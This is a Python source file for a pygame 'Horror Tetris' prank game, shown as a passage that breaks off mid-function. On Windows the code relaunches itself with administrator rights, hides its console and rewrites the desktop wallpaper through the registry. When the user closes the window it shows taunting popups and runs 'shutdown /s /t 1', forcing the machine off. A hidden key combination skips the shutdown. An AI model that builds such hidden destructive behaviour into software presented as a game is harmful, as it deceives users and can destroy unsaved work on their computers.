import pygame
import random
import asyncio
import platform
import numpy as np
import os
import time
import tkinter as tk
from tkinter import Label
import threading
import logging
import sys

try:
    import ctypes
    import winreg
    import win32console
    import win32gui
    import win32con
except ImportError:
    print("Warning: pywin32 is required for Windows features. Install with 'pip install pywin32' or run on another platform.")
    win32_available = False
else:
    win32_available = True

logging.basicConfig(filename='tetris_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

if platform.system() == "Windows" and win32_available:
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    logging.info("Running with administrator privileges.")

if platform.system() == "Windows" and win32_available:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), win32con.SW_HIDE)
    hwnd = win32console.GetConsoleWindow()
    if hwnd:
        win32gui.ShowWindow(hwnd, 0)
    logging.info("Console window hidden.")

GRID_WIDTH = 10
GRID_HEIGHT = 20
CELL_SIZE = 30
WINDOW_WIDTH = GRID_WIDTH * CELL_SIZE + 200
WINDOW_HEIGHT = GRID_HEIGHT * CELL_SIZE
FPS = 60
SIDEBAR_WIDTH = 150
SHAKE_DURATION = 5
SHAKE_AMPLITUDE = 5

BACKGROUND = (20, 20, 30)
GRID_EMPTY = (40, 40, 50)
BORDER = (100, 100, 120)
TEXT_COLOR = (200, 200, 220)
NEXT_FRAME = (30, 30, 40)
GLITCH_RED = (200, 0, 0)
QUESTION_BG = (10, 0, 0)
QUESTION_TEXT = (255, 50, 50)
GLITCH_TEXT = (255, 0, 0)
GLOW_COLOR = (255, 50, 50, 128)
COLORS = [
    (100, 200, 200), (200, 200, 100), (150, 100, 200),
    (100, 200, 100), (200, 100, 100), (100, 100, 200), (200, 150, 100)
]

TETROMINOES = [
    [[[0,0,0,0], [1,1,1,1], [0,0,0,0], [0,0,0,0]],
     [[0,0,1,0], [0,0,1,0], [0,0,1,0], [0,0,1,0]],
     [[0,0,0,0], [1,1,1,1], [0,0,0,0], [0,0,0,0]],
     [[0,0,1,0], [0,0,1,0], [0,0,1,0], [0,0,1,0]]],
    [[[0,1,1,0], [0,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,1,0], [0,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,1,0], [0,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,1,0], [0,1,1,0], [0,0,0,0], [0,0,0,0]]],
    [[[0,1,0,0], [1,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,0,0], [0,1,1,0], [0,1,0,0], [0,0,0,0]],
     [[0,0,0,0], [1,1,1,0], [0,1,0,0], [0,0,0,0]],
     [[0,1,0,0], [1,1,0,0], [0,1,0,0], [0,0,0,0]]],
    [[[0,1,1,0], [1,1,0,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,0,0], [0,1,1,0], [0,0,1,0], [0,0,0,0]],
     [[0,0,0,0], [0,1,1,0], [1,1,0,0], [0,0,0,0]],
     [[0,1,0,0], [1,1,0,0], [1,0,0,0], [0,0,0,0]]],
    [[[1,1,0,0], [0,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,0,1,0], [0,1,1,0], [0,1,0,0], [0,0,0,0]],
     [[0,0,0,0], [1,1,0,0], [0,1,1,0], [0,0,0,0]],
     [[0,1,0,0], [0,1,1,0], [0,0,1,0], [0,0,0,0]]],
    [[[1,0,0,0], [1,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,1,0], [0,1,0,0], [0,1,0,0], [0,0,0,0]],
     [[0,0,0,0], [1,1,1,0], [0,0,1,0], [0,0,0,0]],
     [[0,1,0,0], [0,1,0,0], [1,1,0,0], [0,0,0,0]]],
    [[[0,0,1,0], [1,1,1,0], [0,0,0,0], [0,0,0,0]],
     [[0,1,0,0], [0,1,0,0], [0,1,1,0], [0,0,0,0]],
     [[0,0,0,0], [1,1,1,0], [1,0,0,0], [0,0,0,0]],
     [[1,1,0,0], [0,1,0,0], [0,1,0,0], [0,0,0,0]]]
]

original_wallpaper_path = None
original_wallpaper_color = None

last_space_time = 0
plgr_keys = set() # ! HEY GET OUT !
plgr_timeout = 0

def get_original_settings():
    global original_wallpaper_path, original_wallpaper_color
    if platform.system() == "Windows" and win32_available:
        ubuf = ctypes.create_unicode_buffer(512)
        if ctypes.windll.user32.SystemParametersInfoW(0x0073, len(ubuf), ubuf, 0):
            original_wallpaper_path = ubuf.value
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, winreg.KEY_READ)
            original_wallpaper_color = winreg.QueryValueEx(key, "Background")[0]
            winreg.CloseKey(key)
        except Exception:
            original_wallpaper_color = "0 0 0"
    logging.info("Original wallpaper settings saved.")

def set_solid_color_wallpaper(color_rgb):
    if platform.system() == "Windows" and win32_available:
        r, g, b = color_rgb
        color_str = f"{r} {g} {b}" #hi guys
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, color_str)
        winreg.CloseKey(key)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)
        logging.info(f"Wallpaper set to RGB: {color_rgb}")

def restore_original_settings():
    if platform.system() == "Windows" and win32_available:
        if original_wallpaper_color:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, original_wallpaper_color)
            winreg.CloseKey(key)
        if original_wallpaper_path:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, original_wallpaper_path, 3)
        else:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)
        logging.info("Original wallpaper settings restored.")

def shutdown_computer():
    if platform.system() == "Windows" and win32_available:
        os.system("shutdown /s /t 1")
        logging.info("Initiating computer shutdown.")

def show_final_message():
    def create_windows():
        root = tk.Tk()
        root.withdraw()
        main_window = tk.Toplevel(root)
        main_window.title("...")
        main_window.geometry("600x150")
        main_window.configure(bg='black')
        label = Label(main_window, text="Bye dear computer,", fg='red', bg='black', font=("Courier", 24))
        label.pack(expand=True)
        
        for _ in range(10):
            popup = tk.Toplevel(root)
            popup.title("...")
            popup.geometry("200x100+{}+{}".format(random.randint(0, 1000), random.randint(0, 1000)))
            popup.configure(bg='black')
            label = Label(popup, text="I knew", fg='red', bg='black', font=("Courier", 18))
            label.pack(expand=True)
            time.sleep(0.1)
        
        root.after(4000, root.destroy)
        root.mainloop()

    thread = threading.Thread(target=create_windows)
    thread.start()
    thread.join()
    logging.info("Final message displayed.")

# yes i get it
get_original_settings()

# wait guys is it tetris reference?
class Tetromino:
    def __init__(self, shape):
        self.shape = shape
        self.rotation = 0
        self.position = [GRID_WIDTH // 2 - 2, 0]

    def get_current_shape(self):
        return TETROMINOES[self.shape][self.rotation]

# u know pygame sucks?
try:
    pygame.init()
    screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
    pygame.font.init()
except pygame.error as e:
    logging.error(f"Pygame initialization failed: {e}")
    print(f"Error: {e}. Ensure Pygame is installed (pip install pygame).")
    sys.exit(1)

clock = pygame.time.Clock()
font = pygame.font.SysFont("Verdana", 24, bold=True)
small_font = pygame.font.SysFont("Verdana", 20, bold=True)
glitch_font = pygame.font.SysFont("Courier", 18, bold=True)

# stop reading my code bruh
grid = [[0 for _ in range(GRID_WIDTH)] for _ in range(GRID_HEIGHT)]
current_tetromino = None
next_tetromino = None
game_over = False
score = 0
score_flash = 0
fall_interval = 500
last_fall_time = 0
tetromino_count = 0
glitch_triggered = False
glitch_time = 0
glitch_delay = 0
question_state = 0
selected_option = 0
last_tetromino_time = 0
final_message_time = 0
background_music = None
glitch_sound = None
show_copyright = True
shake_counter = 0

if pygame.mixer.get_init() is None:
    background_music = None
    glitch_sound = None
    logging.warning("Audio device not available. Sound disabled.")
else:
    GLITCH_PHRASES = ["ERROR", "GLITCH", "RUN", "FAIL", "SYSTEM CRASH", "VOID", "BREAK", "ALERT"]
    QUESTIONS = [
        {"text": "u feel good?", "options": ["...", "yes"]},
        {"text": "is everything okay?", "options": ["yes", "no"]},
        {"text": "do u hear that sound?", "options": ["what", "yes"]},
        {"text": "r u alone right now?", "options": ["yes", "no"]},
        {"text": "do u see the shadows move?", "options": ["no", "maybe"]},
        {"text": "r u scared yet?", "options": ["no", "a little"]},
        {"text": "what’s behind u?", "options": ["nothing", "something"]},
        {"text": "do u feel their eyes on u?", "options": ["no", "yes"]},
        {"text": "have u ever hurt someone?", "options": ["no", "once"]},
        {"text": "would u do it again?", "options": ["never", "maybe"]},
        {"text": "r u sure u’re in control?", "options": ["yes", "no"]},
        {"text": "what’s the smell of blood like?", "options": ["unknown", "familiar"]},
        {"text": "can u keep a secret?", "options": ["yes", "no"]},
        {"text": "will u take it to the grave?", "options": ["yes", "no"]},
        {"text": "You know that the answers to the questions won't change anything?", "options": ["yes", "no"]}
    ]

    def generate_noise(intensity):
        sample_rate = 44100
        duration = 1.0
        samples = int(sample_rate * duration)
        noise = np.random.normal(0, intensity, samples)
        noise = np.clip(noise * 32767, -32767, 32767).astype(np.int16)
        stereo_noise = np.column_stack((noise, noise))
        return pygame.sndarray.make_sound(stereo_noise)

    def generate_glitch_sound():
        sample_rate = 44100
        duration = 1.0
        samples = int(sample_rate * duration)
        t = np.linspace(0, duration, samples, False)
        noise = np.sin(2 * np.pi * 50 * t) * 0.2
        noise = (noise * 32767).astype(np.int16)
        stereo_noise = np.column_stack((noise, noise))
        return pygame.sndarray.make_sound(stereo_noise)

    def generate_8bit_music():
        sample_rate = 44100
        notes = [
            (440.00, 0.5), (349.23, 0.5), (329.63, 0.4), (293.66, 0.4),
            (329.63, 0.5), (349.23, 0.5), (440.00, 0.6), (493.88, 0.4),
            (523.25, 0.5), (587.33, 0.5), (659.25, 0.4), (523.25, 0.4),
            (440.00, 0.5), (493.88, 0.5), (440.00, 0.4), (392.00, 0.4),
            (349.23, 0.5), (329.63, 0.5)
        ]
        waveform = []
        for freq, duration in notes:
            samples = int(sample_rate * duration)
            t = np.linspace(0, duration, samples, False)
            note = np.sin(2 * np.pi * freq * t) * 0.3
            waveform.append(note)
        waveform = np.concatenate(waveform)
        waveform = (waveform * 5000).astype(np.int16)
        stereo_wave = np.column_stack((waveform, waveform))
        return pygame.sndarray.make_sound(stereo_wave)

    noise_sounds = [generate_noise(0)] + [generate_noise(0.01 + i * 0.017) for i in range(len(QUESTIONS)-1)] + [generate_noise(0)]
    current_noise = None
    glitch_sound = generate_glitch_sound()
    glitch_sound.set_volume(0.2)
    if platform.system() != "Emscripten":
        try:
            background_music = pygame.mixer.Sound("tetris_8bit.wav")
        except FileNotFoundError:
            background_music = generate_8bit_music()
        background_music.set_volume(0.3)
    else:
        background_music = generate_8bit_music()
        background_music.set_volume(0.3)

def show_copyright_screen():
    screen.fill(BACKGROUND)
    copyright_text = [
        "Horror Tetris",
        "Copyright (c) 2025 UnPlaguer",
        "This is a personal project for learning purposes.",
        "All rights reserved. Not for distribution.",
        "Press SPACE to continue."
    ]
    max_width = WINDOW_WIDTH - 40
    for i, line in enumerate(copyright_text):
        text = font.render(line, True, TEXT_COLOR)
        if text.get_width() > max_width:
            words = line.split()
            current_line = ""
            lines = []
            for word in words:
                test_line = current_line + word + " "
                if font.render(test_line, True, TEXT_COLOR).get_width() <= max_width:
                    current_line = test_line
                else:
                    lines.append(current_line.strip())
                    current_line = word + " "
            lines.append(current_line.strip())
            for j, sub_line in enumerate(lines):
                sub_text = font.render(sub_line, True, TEXT_COLOR)
                y_offset = WINDOW_HEIGHT // 2 - 100 + (i * 60 + j * 30)
                if i == len(copyright_text) - 1:
                    y_offset = WINDOW_HEIGHT - 100
                screen.blit(sub_text, (WINDOW_WIDTH // 2 - sub_text.get_width() // 2, y_offset))
        else:
            y_offset = WINDOW_HEIGHT // 2 - 100 + i * 60
            if i == len(copyright_text) - 1:
                y_offset = WINDOW_HEIGHT - 100
            screen.blit(text, (WINDOW_WIDTH // 2 - text.get_width() // 2, y_offset))
    pygame.display.flip()
    logging.info("Copyright screen displayed.")

def setup():
    global current_tetromino, next_tetromino, grid, score, game_over, last_fall_time, score_flash
    global tetromino_count, glitch_triggered, glitch_time, glitch_delay, question_state, selected_option
    global last_tetromino_time, final_message_time, background_music, shake_counter
    pygame.display.set_caption("Tetris")
    grid = [[0 for _ in range(GRID_WIDTH)] for _ in range(GRID_HEIGHT)]
    score = 0
    score_flash = 0
    game_over = False
    last_fall_time = 0
    tetromino_count = 0
    glitch_triggered = False
    glitch_time = 0
    glitch_delay = random.randint(2000, 5000)
    question_state = 0
    selected_option = 0
    last_tetromino_time = 0
    final_message_time = 0
    shake_counter = 0
    current_tetromino = Tetromino(random.randint(0, 6))
    next_tetromino = Tetromino(random.randint(0, 6))
    if background_music:
        background_music.play(loops=-1)
    logging.info("Game initialized.")

def collision(shape, rotation, position):
    shape_data = TETROMINOES[shape][rotation]
    for i in range(4):
        for j in range(4):
            if shape_data[i][j]:
                row = position[1] + i
                col = position[0] + j
                if (row >= GRID_HEIGHT or col < 0 or col >= GRID_WIDTH or
                    (row >= 0 and grid[row][col] != 0)):
                    return True
    return False

def move_left():
    new_pos = [current_tetromino.position[0] - 1, current_tetromino.position[1]]
    if not collision(current_tetromino.shape, current_tetromino.rotation, new_pos):
        current_tetromino.position[0] -= 1

def move_right():
    new_pos = [current_tetromino.position[0] + 1, current_tetromino.position[1]]
    if not collision(current_tetromino.shape, current_tetromino.rotation, new_pos):
        current_tetromino.position[0] += 1

def move_down():
    new_pos = [current_tetromino.position[0], current_tetromino.position[1] + 1]
    if not collision(current_tetromino.shape, current_tetromino.rotation, new_pos):
        current_tetromino.position[1] += 1
        return True
    return False

def rotate():
    old_rotation = current_tetromino.rotation
    current_tetromino.rotation = (current_tetromino.rotation + 1) % len(TETROMINOES[current_tetromino.shape])
    if collision(current_tetromino.shape, current_tetromino.rotation, current_tetromino.position):
        current_tetromino.rotation = old_rotation

def drop():
    while move_down():
        pass
    fix_tetromino()
    clear_rows()
    spawn_new_tetromino()

def fix_tetromino():
    global tetromino_count, last_tetromino_time, glitch_triggered, glitch_time, glitch_delay, shake_counter
    shape = current_tetromino.get_current_shape()
    for i in range(4):
        for j in range(4):
            if shape[i][j]:
                row = current_tetromino.position[1] + i
                col = current_tetromino.position[0] + j
                if row >= 0:
                    grid[row][col] = current_tetromino.shape + 1
    tetromino_count += 1
    last_tetromino_time = pygame.time.get_ticks()
    shake_counter = SHAKE_DURATION
    if tetromino_count == 6 and not glitch_triggered:
        glitch_triggered = True
        glitch_time = last_tetromino_time
        glitch_delay = random.randint(2000, 5000)
    logging.info(f"Tetromino fixed. Count: {tetromino_count}")

def clear_rows():
    global grid, score, score_flash
    full_rows = [i for i in range(GRID_HEIGHT) if all(cell != 0 for cell in grid[i])]
    if full_rows:
        points = {1: 100, 2: 300, 3: 600, 4: 1000}
        score += points.get(len(full_rows), 100)
        score_flash = 10
        new_grid = [[0] * GRID_WIDTH for _ in range(len(full_rows))]
        new_grid += [row for i, row in enumerate(grid) if i not in full_rows]
        grid = new_grid[:GRID_HEIGHT]
        draw()
        pygame.display.flip()
        logging.info(f"Cleared {len(full_rows)} rows. Score: {score}")

def spawn_new_tetromino():
    global current_tetromino, next_tetromino, game_over
    current_tetromino = next_tetromino
    next_tetromino = Tetromino(random.randint(0, 6))
    if collision(current_tetromino.shape, current_tetromino.rotation, current_tetromino.position):
        game_over = True
    logging.info("New tetromino spawned.")

def draw():
    global score_flash, final_message_time, shake_counter
    if show_copyright:
        show_copyright_screen()
        return
    
    if question_state == 0:
        pygame.display.set_caption("Tetris")
    else:
        pygame.display.set_caption("...")
    
    shake_offset_x = 0
    shake_offset_y = 0
    if shake_counter > 0:
        shake_offset_x = random.randint(-SHAKE_AMPLITUDE, SHAKE_AMPLITUDE)
        shake_offset_y = random.randint(-SHAKE_AMPLITUDE, SHAKE_AMPLITUDE)
        shake_counter -= 1

    if glitch_triggered and question_state == 0 and pygame.time.get_ticks() - glitch_time < 1000:
        screen.fill(GLITCH_RED)
        for row in range(GRID_HEIGHT):
            for col in range(GRID_WIDTH):
                color = GLITCH_RED if grid[row][col] != 0 else GRID_EMPTY
                pygame.draw.rect(screen, color, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), border_radius=5)
                pygame.draw.rect(screen, BORDER, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), 1, border_radius=5)
        shape = current_tetromino.get_current_shape()
        for i in range(4):
            for j in range(4):
                if shape[i][j]:
                    row = current_tetromino.position[1] + i
                    col = current_tetromino.position[0] + j
                    if row >= 0:
                        pygame.draw.rect(screen, GLITCH_RED, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), border_radius=5)
                        pygame.draw.rect(screen, BORDER, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), 1, border_radius=5)
        for _ in range(5):
            text = random.choice(GLITCH_PHRASES)
            glitch_text = glitch_font.render(text, True, GLITCH_TEXT)
            x = random.randint(0, WINDOW_WIDTH - glitch_text.get_width())
            y = random.randint(0, WINDOW_HEIGHT - glitch_text.get_height())
            screen.blit(glitch_text, (x + shake_offset_x, y + shake_offset_y))
        for _ in range(10):
            x1 = random.randint(0, WINDOW_WIDTH)
            y1 = random.randint(0, WINDOW_HEIGHT)
            x2 = x1 + random.randint(-20, 20)
            y2 = y1 + random.randint(-20, 20)
            pygame.draw.line(screen, GLITCH_TEXT, (x1 + shake_offset_x, y1 + shake_offset_y), (x2 + shake_offset_x, y2 + shake_offset_y), 2)
        return

    screen.fill(BACKGROUND)
    if question_state == 0:
        for row in range(GRID_HEIGHT):
            for col in range(GRID_WIDTH):
                color = GRID_EMPTY if grid[row][col] == 0 else COLORS[grid[row][col] - 1]
                pygame.draw.rect(screen, color, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), border_radius=5)
                pygame.draw.rect(screen, BORDER, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), 1, border_radius=5)
        shape = current_tetromino.get_current_shape()
        for i in range(4):
            for j in range(4):
                if shape[i][j]:
                    row = current_tetromino.position[1] + i
                    col = current_tetromino.position[0] + j
                    if row >= 0:
                        pygame.draw.rect(screen, COLORS[current_tetromino.shape], (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), border_radius=5)
                        pygame.draw.rect(screen, BORDER, (col * CELL_SIZE + shake_offset_x, row * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), 1, border_radius=5)
        pygame.draw.rect(screen, NEXT_FRAME, (GRID_WIDTH * CELL_SIZE + shake_offset_x, 0 + shake_offset_y, SIDEBAR_WIDTH, WINDOW_HEIGHT), border_radius=10)
        score_color = (255, 255, 150) if score_flash > 0 else TEXT_COLOR
        if score_flash > 0:
            score_flash -= 1
        score_text = font.render(f"Score: {score}", True, score_color)
        screen.blit(score_text, (GRID_WIDTH * CELL_SIZE + 20 + shake_offset_x, 30 + shake_offset_y))
        pygame.draw.rect(screen, NEXT_FRAME, (GRID_WIDTH * CELL_SIZE + 10 + shake_offset_x, 90 + shake_offset_y, 4 * CELL_SIZE + 10, 4 * CELL_SIZE + 10), border_radius=10)
        pygame.draw.rect(screen, BORDER, (GRID_WIDTH * CELL_SIZE + 10 + shake_offset_x, 90 + shake_offset_y, 4 * CELL_SIZE + 10, 4 * CELL_SIZE + 10), 2, border_radius=10)
        next_text = font.render("Next:", True, TEXT_COLOR)
        screen.blit(next_text, (GRID_WIDTH * CELL_SIZE + 20 + shake_offset_x, 60 + shake_offset_y))
        next_shape = next_tetromino.get_current_shape()
        for i in range(4):
            for j in range(4):
                if next_shape[i][j]:
                    pygame.draw.rect(screen, COLORS[next_tetromino.shape], (GRID_WIDTH * CELL_SIZE + 15 + j * CELL_SIZE + shake_offset_x, 100 + i * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), border_radius=5)
                    pygame.draw.rect(screen, BORDER, (GRID_WIDTH * CELL_SIZE + 15 + j * CELL_SIZE + shake_offset_x, 100 + i * CELL_SIZE + shake_offset_y, CELL_SIZE - 2, CELL_SIZE - 2), 1, border_radius=5)
        if game_over:
            overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT))
            overlay.set_alpha(180)
            overlay.fill((10, 10, 20))
            screen.blit(overlay, (0 + shake_offset_x, 0 + shake_offset_y))
            game_over_text = font.render("Game Over!", True, TEXT_COLOR)
            screen.blit(game_over_text, (WINDOW_WIDTH // 2 - game_over_text.get_width() // 2 + shake_offset_x, WINDOW_HEIGHT // 2 - 30 + shake_offset_y))
    elif question_state <= len(QUESTIONS):
        overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT))
        overlay.set_alpha(200)
        overlay.fill(QUESTION_BG)
        screen.blit(overlay, (0 + shake_offset_x, 0 + shake_offset_y))
        if question_state < len(QUESTIONS):
            if random.random() < 0.05 * question_state:
                screen.fill(GLITCH_RED, (0 + shake_offset_x, 0 + shake_offset_y, WINDOW_WIDTH, 20 + question_state * 5))
            for _ in range(max(0, (question_state - 2) * 2)):
                text = random.choice(GLITCH_PHRASES)
                glitch_text = glitch_font.render(text, True, GLITCH_TEXT)
                x = random.randint(0, WINDOW_WIDTH - glitch_text.get_width())
                y = random.randint(0, WINDOW_HEIGHT - glitch_text.get_height())
                screen.blit(glitch_text, (x + shake_offset_x, y + shake_offset_y))
            for _ in range(max(0, (question_state - 5) * 3)):
                x1, y1 = random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT)
                x2, y2 = x1 + random.randint(-15, 15), y1 + random.randint(-15, 15)
                pygame.draw.line(screen, GLITCH_TEXT, (x1 + shake_offset_x, y1 + shake_offset_y), (x2 + shake_offset_x, y2 + shake_offset_y), 2)
        question = QUESTIONS[question_state - 1]
        question_text = font.render(question["text"], True, QUESTION_TEXT)
        text_width, y_offset = question_text.get_width(), -60
        if text_width > WINDOW_WIDTH - 40:
            words, lines, current_line = question["text"].split(), [], ""
            for word in words:
                test_line = current_line + word + " "
                if font.render(test_line, True, QUESTION_TEXT).get_width() < WINDOW_WIDTH - 40:
                    current_line = test_line
                else:
                    lines.append(current_line.strip())
                    current_line = word + " "
            lines.append(current_line.strip())
            for i, line in enumerate(lines):
                line_text = font.render(line, True, QUESTION_TEXT)
                screen.blit(line_text, (WINDOW_WIDTH//2 - line_text.get_width()//2 + shake_offset_x, WINDOW_HEIGHT//2 + y_offset + i*30 + shake_offset_y))
        else:
            screen.blit(question_text, (WINDOW_WIDTH//2 - text_width//2 + shake_offset_x, WINDOW_HEIGHT//2 + y_offset + shake_offset_y))
        for i, option in enumerate(question["options"]):
            option_text = small_font.render(option, True, QUESTION_TEXT if i == selected_option else TEXT_COLOR)
            x = WINDOW_WIDTH//2 - option_text.get_width()//2 + shake_offset_x
            y = WINDOW_HEIGHT//2 + 40 + i*40 + shake_offset_y
            screen.blit(option_text, (x, y))
    elif question_state == len(QUESTIONS) + 1:
        overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT))
        overlay.set_alpha(200)
        overlay.fill(QUESTION_BG)
        screen.blit(overlay, (0 + shake_offset_x, 0 + shake_offset_y))
        message = "..."
        text = font.render(message, True, QUESTION_TEXT)
        screen.blit(text, (WINDOW_WIDTH//2 - text.get_width()//2 + shake_offset_x, WINDOW_HEIGHT//2 - text.get_height()//2 + shake_offset_y))
    elif question_state >= len(QUESTIONS) + 2:
        overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT))
        overlay.set_alpha(200)
        overlay.fill(QUESTION_BG)
        screen.blit(overlay, (0 + shake_offset_x, 0 + shake_offset_y))
        if question_state == len(QUESTIONS) + 2:
            message = "You understand that doing this is extremely stupid and bastardly."
        else:
            message = "You must apologize and correct your mistakes, but you must also bear the punishment."
        text = font.render(message, True, QUESTION_TEXT)
        text_width = text.get_width()
        if text_width > WINDOW_WIDTH - 40:
            words, lines, current_line = message.split(), [], ""
            for word in words:
                test_line = current_line + word + " "
                if font.render(test_line, True, QUESTION_TEXT).get_width() < WINDOW_WIDTH - 40:
                    current_line = test_line
                else:
                    lines.append(current_line.strip())
                    current_line = word + " "
            lines.append(current_line.strip())
            total_height = len(lines) * 30
            start_y = WINDOW_HEIGHT // 2 - total_height // 2
            for i, line in enumerate(lines):
                line_text = font.render(line, True, QUESTION_TEXT)
                screen.blit(line_text, (WINDOW_WIDTH//2 - line_text.get_width()//2 + shake_offset_x, start_y + i*30 + shake_offset_y))
        else:
            screen.blit(text, (WINDOW_WIDTH//2 - text_width//2 + shake_offset_x, WINDOW_HEIGHT//2 - text.get_height()//2 + shake_offset_y))

def main_loop():
    global last_fall_time, game_over, glitch_triggered, glitch_time, glitch_delay, question_state
    global selected_option, tetromino_count, last_tetromino_time, current_noise, final_message_time
    global last_space_time, show_copyright, shake_counter, plgr_keys, plgr_timeout
    current_time = pygame.time.get_ticks()

    if show_copyright:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                logging.info("Game closed via QUIT event during copyright screen.")
                return False
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                show_copyright = False
                setup()
                logging.info("Copyright screen passed. Game starting.")
        draw()
        return True

    if glitch_triggered and question_state == 0 and current_time - glitch_time < 1000:
        if background_music:
            background_music.set_volume(0.2)
        if glitch_sound:
            glitch_sound.play(loops=0)
    elif current_time - glitch_time >= 1000 and glitch_sound.get_volume() > 0:
        glitch_sound.stop()
        if background_music and question_state == 0:
            background_music.set_volume(0.3)

    keys = pygame.key.get_pressed()
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            if platform.system() == "Windows" and win32_available:
                set_solid_color_wallpaper((150, 0, 0))
                show_final_message()
                shutdown_computer()
            else:
                if platform.system() == "Windows" and win32_available:
                    restore_original_settings()
            logging.info("Game closed via QUIT event.")
            return False
        elif event.type == pygame.KEYDOWN:
            if event.key in (pygame.K_p, pygame.K_l, pygame.K_g, pygame.K_r):
                plgr_keys.add(event.key)
                plgr_timeout = current_time + 1000  # learn math btw
            if not game_over and question_state == 0:
                if event.key == pygame.K_LEFT:
                    move_left()
                elif event.key == pygame.K_RIGHT:
                    move_right()
                elif event.key == pygame.K_DOWN:
                    move_down()
                elif event.key == pygame.K_UP:
                    rotate()
                elif event.key == pygame.K_SPACE and current_time - last_space_time > 2000:
                    drop()
                    last_space_time = current_time
            elif question_state > 0 and question_state <= len(QUESTIONS):
                if event.key in (pygame.K_UP, pygame.K_LEFT):
                    selected_option = (selected_option - 1) % len(QUESTIONS[question_state - 1]["options"])
                elif event.key in (pygame.K_DOWN, pygame.K_RIGHT):
                    selected_option = (selected_option + 1) % len(QUESTIONS[question_state - 1]["options"])
                elif event.key in (pygame.K_SPACE, pygame.K_RETURN):
                    question_state += 1
                    selected_option = 0
                    if question_state > len(QUESTIONS):
                        final_message_time = current_time
                        if current_noise:
                            current_noise.stop()
                        if background_music:
                            background_music.stop()
                        if glitch_sound:
                            glitch_sound.stop()
                    else:
                        if current_noise:
                            current_noise.stop()
                        if question_state < len(QUESTIONS):  # i hate my noise bro
                            current_noise = noise_sounds[question_state - 1]
                            if current_noise and question_state > 1:
                                current_noise.play(loops=-1)
                        if background_music:
                            background_music.stop()
                        if glitch_sound:
                            glitch_sound.stop()
        elif event.type == pygame.KEYUP:
            if event.key in (pygame.K_p, pygame.K_l, pygame.K_g, pygame.K_r):
                plgr_keys.discard(event.key)

    # Yeah guys dont press buttons, its for test
    if (pygame.K_p in plgr_keys and pygame.K_l in plgr_keys and 
        pygame.K_g in plgr_keys and pygame.K_r in plgr_keys and 
        current_time <= plgr_timeout):
        pygame.quit()
        if platform.system() == "Windows" and win32_available:
            restore_original_settings()
        logging.info("Game closed via PLGR combination.")
        return False

    if question_state == len(QUESTIONS) + 1 and current_time - final_message_time >= 4000:
        question_state = len(QUESTIONS) + 2
        final_message_time = current_time
        if current_noise:
            current_noise.stop()
    elif question_state == len(QUESTIONS) + 2 and current_time - final_message_time >= 4000:
        question_state = len(QUESTIONS) + 3
        final_message_time = current_time
        if current_noise:
            current_noise.stop()
    elif question_state == len(QUESTIONS) + 3 and current_time - final_message_time >= 5000:
        logging.info("Starting finale sequence.")
        return False

    if not game_over and question_state == 0:
        if glitch_triggered and current_time - glitch_time >= 1000:
            question_state = 1
            current_noise = noise_sounds[0]
            if background_music:
                background_music.stop()
            if glitch_sound:
                glitch_sound.stop()
        elif not glitch_triggered and tetromino_count >= 6 and current_time - last_tetromino_time > glitch_delay:
            glitch_triggered = True
            glitch_time = current_time
        elif current_time - last_fall_time > fall_interval:
            if not move_down():
                fix_tetromino()
                clear_rows()
                spawn_new_tetromino()
            last_fall_time = current_time

    draw()
    pygame.display.flip()
    return True

async def apology_screen():
    apology_screen_surface = pygame.display.set_mode((500, 200))
    pygame.display.set_caption("...")
    apology_font = pygame.font.SysFont("Courier", 30, bold=True)
    option_font = pygame.font.SysFont("Courier", 24, bold=True)
    selected_apology_option = 0

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
